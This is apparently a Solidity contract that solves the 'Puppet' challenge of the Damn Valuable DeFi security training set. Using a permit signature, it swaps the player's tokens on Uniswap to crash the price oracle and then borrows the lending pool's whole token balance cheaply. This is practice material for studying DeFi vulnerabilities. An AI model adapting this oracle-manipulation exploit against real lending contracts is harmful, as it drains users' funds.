// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";

contract Taker {
    using Address for address payable;

    address public immutable uniswapExchange;
    DamnValuableToken public immutable token;
    address lender;
    bytes public sig;
    uint256 constant PLAYER_TOKEN_BALANCE = 1000 * 10 ** 18;
    uint256 constant DEADLINE = 2 * 10 ** 10;
       
    constructor(address tokenAddress, address uniswapExchangeAddress, address _lender, bytes memory _sig) payable {
        token = DamnValuableToken(tokenAddress);
        uniswapExchange = uniswapExchangeAddress;
        lender = _lender;
        sig = _sig;
        
        (bytes32 r, bytes32 s, uint8 v) = splitSignature(sig);
        
        token.permit(
            msg.sender,
            address(this),
            PLAYER_TOKEN_BALANCE,
            DEADLINE,
            v, 
            r, 
            s
        );
        
        token.transferFrom(msg.sender, address(this), PLAYER_TOKEN_BALANCE);
        token.approve(uniswapExchange, token.balanceOf(address(this)));

        (bool successSwap, ) = uniswapExchange.call(
        abi.encodeWithSignature(
            "tokenToEthSwapInput(uint256,uint256,uint256)",
            token.balanceOf(address(this)),
            1,
            block.timestamp * 2
            )
        );
      
        (bool successBorrow, ) = lender.call{value: address(this).balance}(
            abi.encodeWithSignature(
                "borrow(uint256,address)",
                token.balanceOf(address(lender)),
                msg.sender
            )
        );
    }

    function splitSignature(
        bytes memory ownerSig
    ) public pure returns (bytes32 r, bytes32 s, uint8 v) {
        require(ownerSig.length == 65, "invalid signature length");

        assembly {
            /*
            First 32 bytes stores the length of the signature

            add(sig, 32) = pointer of sig + 32
            effectively, skips first 32 bytes of signature

            mload(p) loads next 32 bytes starting at the memory address p into memory
            */

            // first 32 bytes, after the length prefix
            r := mload(add(ownerSig, 32))
            // second 32 bytes
            s := mload(add(ownerSig, 64))
            // final byte (first byte of the next 32 bytes)
            v := byte(0, mload(add(ownerSig, 96)))
        }

        // implicitly return (r, s, v)
    }
}